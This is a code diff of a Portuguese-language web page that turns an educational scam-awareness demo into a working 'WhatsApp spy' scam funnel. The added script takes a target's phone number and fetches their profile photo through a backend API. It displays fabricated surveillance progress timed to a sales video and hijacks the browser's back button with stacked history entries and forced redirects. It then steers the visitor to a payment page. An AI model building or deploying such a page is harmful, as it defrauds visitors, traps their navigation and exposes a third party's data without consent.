                     <svg width="20" height="20" fill="none" stroke="#f472b6" stroke-width="2" viewBox="0 0 24 24">
-                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
-                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
-                        <path d="M21 15l-5-5L5 21"></path>
+                        <rect x="3" y="3" width="18" height="18" rx="2"/>
+                        <circle cx="8.5" cy="8.5" r="1.5"/>
+                        <path d="M21 15l-5-5L5 21"/>
                     </svg>
                 </div>
                 <div class="item-text">
@@ -703,8 +1212,8 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="analysis-item" id="item-2">
                 <div class="item-icon" style="background:rgba(245,158,11,0.1);">
                     <svg width="20" height="20" fill="none" stroke="#fbbf24" stroke-width="2" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <polyline points="12 6 12 12 16 14"></polyline>
+                        <circle cx="12" cy="12" r="10"/>
+                        <polyline points="12 6 12 12 16 14"/>
                     </svg>
                 </div>
                 <div class="item-text">
@@ -717,8 +1226,8 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="analysis-item" id="item-3">
                 <div class="item-icon" style="background:rgba(99,102,241,0.1);">
                     <svg width="20" height="20" fill="none" stroke="#818cf8" stroke-width="2" viewBox="0 0 24 24">
-                        <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"></path><circle cx="9" cy="7" r="4"></circle>
-                        <path d="M23 21v-2a4 4 0 00-3-3.87"></path><path d="M16 3.13a4 4 0 010 7.75"></path>
+                        <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/>
+                        <path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/>
                     </svg>
                 </div>
                 <div class="item-text">
@@ -731,8 +1240,8 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="analysis-item" id="item-4">
                 <div class="item-icon" style="background:rgba(16,185,129,0.1);">
                     <svg width="20" height="20" fill="none" stroke="#34d399" stroke-width="2" viewBox="0 0 24 24">
-                        <path d="M12 22s-8-4.5-8-11.8A8 8 0 0112 2a8 8 0 018 8.2c0 7.3-8 11.8-8 11.8z"></path>
-                        <circle cx="12" cy="10" r="3"></circle>
+                        <path d="M12 22s-8-4.5-8-11.8A8 8 0 0112 2a8 8 0 018 8.2c0 7.3-8 11.8-8 11.8z"/>
+                        <circle cx="12" cy="10" r="3"/>
                     </svg>
                 </div>
                 <div class="item-text">
@@ -751,62 +1260,512 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
     </div>
 </div>
 
-<section id="demo-report" class="demo-report" tabindex="-1" hidden>
-<h2>O golpe por trás da promessa</h2>
-<p><strong>Nenhuma mensagem, foto ou localização foi acessada.</strong> O progresso e os resultados anteriores foram gerados por um cronômetro no seu navegador.</p>
-<p>Na simulação, a próxima etapa seria uma cobrança para “liberar” um relatório inexistente. Esta demonstração não possui pagamento.</p>
-<p>Os sinais de alerta são: promessa de acesso a dados privados apenas com um telefone, garantia de anonimato, investigação fabricada e pressão para continuar assistindo ou pagar.</p>
-<p>Não informe dados nem pague por essas promessas. Caso tenha fornecido uma senha, troque-a e ative a verificação em duas etapas. Se tiver feito um pagamento, procure seu banco e denuncie a página pela plataforma onde a encontrou.</p>
-<button type="button" id="restart-demo">Reiniciar demonstração</button>
-</section>
 <script>
-'use strict';
-const el = id => document.getElementById(id);
-let timer;
-const phone = el('zrAlvo');
-phone.value = '11 90000-0000';
-phone.setAttribute('aria-label', 'Número fictício para demonstração');
-phone.addEventListener('input', () => {
- const n = phone.value.replace(/\D/g,'').slice(0,11);
- phone.value = n.slice(0,2) + (n.length>2?' '+n.slice(2,7):'') + (n.length>7?'-'+n.slice(7):'');
-});
-el('vturb-container').innerHTML = '<video id="demo-video" controls playsinline preload="metadata" aria-label="Vídeo da demonstração educativa" style="display:block;width:100%;max-width:300px;max-height:70vh;margin:0 auto;background:#000;border-radius:16px"><source src="assets/demo-seguranca.mp4" type="video/mp4">Seu navegador não suporta este vídeo.</video><div class="demo-panel"><p id="demo-stage" aria-live="polite">Simulação pronta para começar.</p><button type="button" id="finish-demo">Concluir simulação agora</button></div>';
-function complete(){
- clearInterval(timer);
- el('pct-text').textContent='100%';
- el('prog-fill').style.width='100%';
- el('avatar-ring').style.strokeDashoffset='0';
- document.querySelectorAll('.analysis-item').forEach(item=>{item.classList.add('done');item.querySelector('.item-status').textContent='✓ Fictício';});
- el('lbl-analyzing').style.display='none';el('lbl-done').style.display='inline';
- el('wait-text').style.display='none';el('spied-text').style.display='none';
- el('done-text').style.display='block';
- el('demo-stage').textContent='Simulação concluída. Todos os resultados são fictícios.';
- el('cta-btn-wrap').classList.remove('hide');
-}
-function start(){
- if(phone.value.replace(/\D/g,'').length<10){el('phoneError').classList.add('show');return;}
- el('phoneError').classList.remove('show');
- el('step-input').style.display='none';el('step-analysis').style.display='block';
- el('profile-number').textContent='+55 '+phone.value;
- el('target-number').textContent='+55 '+phone.value;
- el('spied-text').style.display='block';
- let progress=0;
- timer=setInterval(()=>{
- progress+=1;el('pct-text').textContent=progress+'%';el('prog-fill').style.width=progress+'%';
- el('avatar-ring').style.strokeDashoffset=String(125.6*(1-progress/100));
- const count=Math.min(5,Math.floor(progress/20));
- document.querySelectorAll('.analysis-item').forEach((item,i)=>{if(i<count){item.classList.add('done');item.querySelector('.item-status').textContent='✓ Fictício';}});
- el('demo-stage').textContent='Gerando resultados fictícios: '+progress+'%';
- if(progress>=100)complete();
- },200);
- window.scrollTo({top:0,behavior:'smooth'});
-}
-el('spyBtn').addEventListener('click',start);
-phone.addEventListener('keydown',event=>{if(event.key==='Enter')start();});
-el('finish-demo').addEventListener('click',complete);
-el('cta-btn').addEventListener('click',event=>{
- event.preventDefault();el('demo-report').hidden=false;el('demo-report').focus();el('demo-report').scrollIntoView({behavior:'smooth'});
-});
-el('restart-demo').addEventListener('click',()=>window.location.reload());
+(function() {
+    
+    
+    
+
+    const lsGet = function (chave) {
+        try { return localStorage.getItem(chave); } catch (e) { return null; }
+    };
+    const lsSet = function (chave, valor) {
+        try { localStorage.setItem(chave, valor); return true; } catch (e) { return false; }
+    };
+    const lsDel = function (chave) {
+        try { localStorage.removeItem(chave); } catch (e) {}
+    };
+
+    const API_URL = 'api-wa.php';
+    const API_PIC_URL = '/api-wa-pic.php';
+    const REDIRECT_URL = 'cta.html';
+    const DEFAULT_AVATAR = '/assets/user.jpeg';
+    const TOTAL_DURATION = 365000;
+    const PITCH_SEGUNDOS = TOTAL_DURATION / 1000;
+
+    const FORCED_SRC = 'M-FRONT';
+
+    
+    
+    
+    const COUNTRY = { code: 'BR', name: 'Brasil', dial: '+55', flag: '🇧🇷' };
+
+    
+    
+    
+    const stepInput = document.getElementById('step-input');
+    const stepAnalysis = document.getElementById('step-analysis');
+
+    const phoneInput = document.getElementById('zrAlvo');
+    const phoneError = document.getElementById('phoneError');
+    const spyBtn = document.getElementById('spyBtn');
+    const loadingBar = document.getElementById('loadingBar');
+    const loadingFill = document.getElementById('loadingFill');
+    const loadingLabel = document.getElementById('loadingLabel');
+
+    
+    
+    
+    const profileAvatar = document.getElementById('profile-avatar');
+    const profileNumber = document.getElementById('profile-number');
+    const targetNumber = document.getElementById('target-number');
+    const pctText = document.getElementById('pct-text');
+    const progFill = document.getElementById('prog-fill');
+    const progTrack = document.getElementById('prog-track');
+    const pauseAlert = document.getElementById('pause-alert');
+    const avatarRing = document.getElementById('avatar-ring');
+
+    
+    
+    
+    phoneInput.addEventListener('input', function() {
+        var raw = this.value.replace(/\D/g, '').substring(0, 11);
+        var formatted = '';
+        if (raw.length > 0) formatted = raw.substring(0, 2);
+        if (raw.length > 2) formatted += ' ' + raw.substring(2, 7);
+        if (raw.length > 7) formatted += '-' + raw.substring(7, 11);
+        this.value = formatted;
+    });
+
+    phoneInput.addEventListener('keypress', function(e) {
+        if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Tab' && e.key !== 'Enter') {
+            e.preventDefault();
+        }
+    });
+
+    
+    
+    
+    function getFullPhone() {
+        const raw = phoneInput.value.replace(/\D/g, '');
+        return {
+            display: COUNTRY.dial + ' ' + phoneInput.value.trim(),
+            digits: '55' + raw
+        };
+    }
+
+    function validatePhone() {
+        const raw = phoneInput.value.replace(/\D/g, '');
+        if (raw.length < 10) {
+            document.getElementById('phoneErrorText').textContent = 'Insira um número válido';
+            phoneError.classList.add('show');
+            return false;
+        }
+        phoneError.classList.remove('show');
+        return true;
+    }
+
+    
+    let pendingPhoto = null;
+    let photoReady = false;
+    let photoRevealed = false;
+
+    function fetchProfileInBackground(digits) {
+        const avatarWrap = document.querySelector('.avatar-wrap');
+        avatarWrap.classList.add('avatar-scanning');
+
+        const fotoSalva = lsGet('wa_photo');
+        if (fotoSalva) {
+            pendingPhoto = fotoSalva;
+            photoReady = true;
+            if (finalizado) revealPhoto();
+            return;
+        }
+
+        Promise.race([
+            fetch(API_PIC_URL + '?phone=' + encodeURIComponent(digits) + '&o=scan'),
+            new Promise((_, rej) => setTimeout(() => rej('timeout'), 70000))
+        ])
+        .then(r => {
+            if (r.headers.get('x-zr-retry') === '0') {
+                lsSet('wa_final', digits);
+            }
+            const consulta = r.headers.get('x-zr-consulta');
+            if (consulta) {
+                lsSet('wa_consulta', consulta);
+            }
+            return r.json();
+        })
+        .then(data => {
+            if (data.photo) {
+                lsSet('wa_photo', data.photo);
+                pendingPhoto = data.photo;
+                photoReady = true;
+            }
+            if (finalizado) revealPhoto();
+        })
+        .catch(() => {
+            photoReady = true;
+            pendingPhoto = null;
+            if (finalizado) revealPhoto();
+        });
+    }
+
+    function revealPhoto() {
+        if (photoRevealed) return;
+        photoRevealed = true;
+        const avatarWrap = document.querySelector('.avatar-wrap');
+        const avatarFallback = document.getElementById('avatar-fallback');
+        avatarWrap.classList.remove('avatar-scanning');
+
+        if (pendingPhoto) {
+            profileAvatar.onerror = function() {
+                profileAvatar.onerror = null;
+                profileAvatar.removeAttribute('src');
+                profileAvatar.style.display = 'none';
+                profileAvatar.classList.remove('avatar-reveal');
+                if (avatarFallback) avatarFallback.style.display = 'flex';
+            };
+            profileAvatar.src = pendingPhoto;
+            profileAvatar.style.display = 'block';
+            profileAvatar.classList.add('avatar-reveal');
+            if (avatarFallback) avatarFallback.style.display = 'none';
+        } else {
+            profileAvatar.style.display = 'none';
+            if (avatarFallback) avatarFallback.style.display = 'flex';
+        }
+    }
+
+    async function handleSubmit() {
+        if (!validatePhone()) return;
+
+        const { display, digits } = getFullPhone();
+
+        
+        spyBtn.disabled = true;
+        loadingBar.classList.add('show');
+        montarPlayer();
+
+
+        const steps = [
+            { pct: 20, text: '🔍 Buscando número...' },
+            { pct: 50, text: '📡 Verificando WhatsApp...' },
+            { pct: 80, text: '✅ Número encontrado!' },
+            { pct: 100, text: '🚀 Iniciando análise...' }
+        ];
+
+        for (let i = 0; i < steps.length; i++) {
+            loadingFill.style.width = steps[i].pct + '%';
+            loadingLabel.textContent = steps[i].text;
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+
+        if (lsGet('wa_digits') !== digits) {
+            lsDel('wa_photo');
+            lsDel('wa_final');
+            lsDel('wa_consulta');
+        }
+        lsSet('wa_phone', display);
+        lsSet('wa_digits', digits);
+        lsSet('wa_country', JSON.stringify(COUNTRY));
+
+
+        startAnalysis(display, digits);
+
+
+        fetchProfileInBackground(digits);
+    }
+
+    spyBtn.addEventListener('click', handleSubmit);
+    phoneInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleSubmit();
+    });
+
+    
+    
+    
+    let analysisStartTime;
+    const CIRC = 125.6;
+
+    const milestones = [
+        { id: 'item-0', at: 20 },
+        { id: 'item-1', at: 40 },
+        { id: 'item-2', at: 62 },
+        { id: 'item-3', at: 80 },
+        { id: 'item-4', at: 95 },
+    ];
+    const done = new Set();
+
+    let oPlayer = null;
+    let vslAberta = false;
+    let seguraTimer = null;
+    let cronometro = null;
+    let modoVideo = false;
+    let pausadoDesde = null;
+    let finalizado = false;
+    let fracaoMax = 0;
+    let pausaVisivel = false;
+
+    function segurarAteAVSL() {
+        if (vslAberta || !oPlayer) return;
+        try { oPlayer.mute(); } catch (e) {}
+    }
+
+    function soltarNaVSL() {
+        vslAberta = true;
+        clearInterval(seguraTimer);
+        seguraTimer = null;
+        if (!oPlayer) return;
+
+        const andou = typeof oPlayer.currentTime === 'number' && oPlayer.currentTime > 0.05;
+        if (andou) { try { oPlayer.pause(); } catch (e) {} }
+        try { oPlayer.seek(0); } catch (e) {}
+        try { oPlayer.unmute(); } catch (e) {}
+
+        let tentativas = 0;
+        const tentarTocar = function () {
+            if (!oPlayer || oPlayer.paused === false || tentativas++ > 25) return;
+            try {
+                const p = oPlayer.play();
+                if (p && p.catch) p.catch(function () {});
+            } catch (e) {}
+            setTimeout(tentarTocar, 100);
+        };
+        tentarTocar();
+    }
+
+    function montarPlayer() {
+        if (oPlayer) return;
+
+        const vturbContainer = document.getElementById('vturb-container');
+        vturbContainer.innerHTML = '<vturb-smartplayer id="vid-6a9348e5f88d4164c6267bb2" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>';
+
+        oPlayer = vturbContainer.querySelector('vturb-smartplayer');
+        if (oPlayer) {
+            oPlayer.addEventListener('video:play', segurarAteAVSL);
+            oPlayer.addEventListener('video:playing', segurarAteAVSL);
+            oPlayer.addEventListener('video:canplay', segurarAteAVSL);
+            oPlayer.addEventListener('video:loadeddata', segurarAteAVSL);
+            oPlayer.addEventListener('video:timeupdate', segurarAteAVSL);
+            oPlayer.addEventListener('player:ready', function () {
+                segurarAteAVSL();
+                if (typeof oPlayer.displayHiddenElements !== 'function') return;
+                oPlayer.displayHiddenElements(PITCH_SEGUNDOS, ['.hide'], {
+                    persist: true,
+                    callback: finalizar
+                });
+            });
+        }
+
+        const script = document.createElement('script');
+        script.src = 'https://scripts.converteai.net/6dcf6846-12ab-4916-9ce8-4003dce97318/players/6a9348e5f88d4164c6267bb2/v4/player.js';
+        script.async = true;
+        document.head.appendChild(script);
+
+        segurarAteAVSL();
+        seguraTimer = setInterval(segurarAteAVSL, 25);
+    }
+
+    function startAnalysis(display, digits) {
+
+        analiseComecou = true;
+        stepInput.style.display = 'none';
+        stepAnalysis.style.display = 'block';
+
+
+        profileNumber.textContent = display;
+        targetNumber.textContent = display;
+
+
+        montarPlayer();
+        soltarNaVSL();
+
+        analysisStartTime = Date.now();
+        cronometro = setInterval(tique, 100);
+        tique();
+    }
+
+    function mostrarAvisoPausa() {
+        if (pausaVisivel) return;
+        pausaVisivel = true;
+        if (pauseAlert) pauseAlert.classList.add('show');
+        if (progTrack) progTrack.classList.add('travada');
+        const waitText = document.getElementById('wait-text');
+        if (waitText) waitText.style.display = 'none';
+    }
+
+    function esconderAvisoPausa() {
+        if (!pausaVisivel) return;
+        pausaVisivel = false;
+        if (pauseAlert) pauseAlert.classList.remove('show');
+        if (progTrack) progTrack.classList.remove('travada');
+        const waitText = document.getElementById('wait-text');
+        if (waitText && !finalizado) waitText.style.display = '';
+    }
+
+    const BACK_PREPITCH_URL = '/bp1-zapion/';
+    const BACK_POSPITCH_URL = '/bk1-zapion/';
+    let destinoBack = BACK_PREPITCH_URL;
+    let backArmado = false;
+    let analiseComecou = false;
+
+    function armarBack() {
+        destinoBack = BACK_POSPITCH_URL;
+    }
+
+    function aoPrimeiroGesto(e) {
+        if (e && e.target && e.target.closest && e.target.closest('#spyBtn')) return;
+        armarBackPrePitch();
+        ['click', 'touchend', 'pointerup', 'keydown'].forEach(function (ev) {
+            document.removeEventListener(ev, aoPrimeiroGesto);
+        });
+    }
+
+    function armarBackNoPrimeiroGesto() {
+        ['click', 'touchend', 'pointerup', 'keydown'].forEach(function (ev) {
+            document.addEventListener(ev, aoPrimeiroGesto);
+        });
+    }
+
+    armarBackNoPrimeiroGesto();
+
+    function empilharTrava() {
+        history.pushState({ zrBack: 1 }, '', location.href);
+        history.pushState({ zrBack: 1 }, '', location.href);
+        history.pushState({ zrBack: 1 }, '', location.href);
+    }
+
+    function armarBackPrePitch() {
+        if (backArmado) return;
+        backArmado = true;
+        empilharTrava();
+        window.addEventListener('popstate', function () {
+            if (!analiseComecou) {
+                history.back();
+                return;
+            }
+            if (!destinoBack) {
+                history.pushState({ zrBack: 1 }, '', location.href);
+                return;
+            }
+            const destino = destinoBack + (document.location.search || '');
+            // O back-encadeia.js não roda aqui: o back desta página sai por este popstate, com o gancho dele e o degrau do destino.
+            try { if (window.zrEvento) window.zrEvento('back_disparado', { degrau: destinoBack.replace(/\//g, '') }); } catch (e) {}
+            setTimeout(function () { location.href = destino; }, 1);
+        });
+    }
+
+    window.addEventListener('pageshow', function (e) {
+        if (!e.persisted || !backArmado) return;
+        if (history.state && history.state.zrBack) return;
+        empilharTrava();
+    });
+
+    function easeOut(t) { return Math.pow(t, 0.45); }
+
+    function pintar(fracao) {
+        if (finalizado) return 1;
+
+        let linear = fracao > 0 ? fracao : 0;
+        if (linear > 1) linear = 1;
+        if (linear < fracaoMax) linear = fracaoMax;
+        fracaoMax = linear;
+
+        const eased = easeOut(linear);
+        const displayPct = Math.floor(eased * 100);
+
+        if (progFill) progFill.style.width = (eased * 100) + '%';
+        if (avatarRing) avatarRing.style.strokeDashoffset = CIRC - eased * CIRC;
+        if (pctText) pctText.textContent = displayPct + '%';
+
+        if (photoReady && !photoRevealed) {
+            revealPhoto();
+        }
+
+        milestones.forEach(m => {
+            if (displayPct >= m.at && !done.has(m.id)) {
+                done.add(m.id);
+                markDone(m.id);
+            }
+        });
+
+        if (linear >= 1) finalizar();
+        return linear;
+    }
+
+    function tique() {
+        if (finalizado) return;
+
+        const tempo = oPlayer && typeof oPlayer.currentTime === 'number' ? oPlayer.currentTime : 0;
+
+        if (oPlayer && oPlayer.paused === false && tempo > 0) {
+            modoVideo = true;
+            pausadoDesde = null;
+            esconderAvisoPausa();
+            pintar(tempo / PITCH_SEGUNDOS);
+            return;
+        }
+
+        if (modoVideo) {
+            if (pausadoDesde === null) pausadoDesde = Date.now();
+            else if (Date.now() - pausadoDesde >= 300) mostrarAvisoPausa();
+            return;
+        }
+
+        pintar((Date.now() - analysisStartTime) / TOTAL_DURATION);
+    }
+
+    function finalizar() {
+        if (finalizado) return;
+        finalizado = true;
+        fracaoMax = 1;
+
+        clearInterval(cronometro);
+        esconderAvisoPausa();
+
+        if (pctText) pctText.textContent = '100%';
+        if (progFill) progFill.style.width = '100%';
+        if (avatarRing) avatarRing.style.strokeDashoffset = 0;
+
+        document.getElementById('lbl-analyzing').style.display = 'none';
+        document.getElementById('lbl-done').style.display = 'block';
+        document.getElementById('wait-text').style.display = 'none';
+        document.getElementById('spied-text').style.display = 'none';
+        document.getElementById('done-text').style.display = 'block';
+
+        milestones.forEach(m => { if (!done.has(m.id)) { done.add(m.id); markDone(m.id); } });
+
+        const ctaBtn = document.getElementById('cta-btn');
+        if (ctaBtn) {
+            const forward = new URLSearchParams();
+            forward.set('src', FORCED_SRC);
+            ctaBtn.href = REDIRECT_URL + '?' + forward.toString();
+        }
+
+
+        const wrap = document.getElementById('cta-btn-wrap');
+        if (wrap) {
+            wrap.classList.remove('hide');
+            setTimeout(() => {
+                wrap.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 300);
+        }
+
+        armarBack();
+    }
+
+    function markDone(id) {
+        const item = document.getElementById(id);
+        if (!item) return;
+        item.classList.add('done');
+        item.querySelector('.item-status').innerHTML = `
+            <div class="check-circle">
+                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+                </svg>
+            </div>`;
+    }
+
+    document.addEventListener('click', function(e) {
+        const btn = e.target.closest('#cta-btn');
+        if (!btn) return;
+        e.preventDefault();
+        window.location.href = 'cta.html?src=' + FORCED_SRC;
+    });
+
+})();
 </script>
-</body></html>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"f0cae46b20da495083c4de943f3bd755","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
